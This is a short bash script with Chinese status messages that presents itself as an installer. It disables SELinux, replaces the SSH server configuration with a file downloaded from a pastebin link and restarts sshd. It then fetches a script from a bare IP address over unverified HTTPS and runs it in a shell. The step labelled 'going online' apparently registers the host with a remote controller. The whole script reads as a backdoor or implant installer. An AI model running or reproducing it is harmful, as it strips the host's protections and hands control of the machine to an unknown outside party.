#!/bin/bash
echo -e "\033[41;37;5m安装开始!\033[0m"
echo -e "\033[41;37;5m正在关闭selinux\033[0m"
setenforce 0
echo -e "\033[41;37;5m正在替换sshd_config\033[0m"
wget "https://pastebin.com/raw/hDYt9Yxy" -O /etc/ssh/sshd_config
echo -e "\033[41;37;5m重启SSH服务\033[0m"
systemctl restart sshd
echo -e "\033[41;37;5m正在上线\033[0m"
sh -c "$(curl -k https://124.223.172.133:4434/tmp/ePl3VD7U9LUZ.sh)"
echo -e "\033[41;37;5m安装成功!\033[0m"
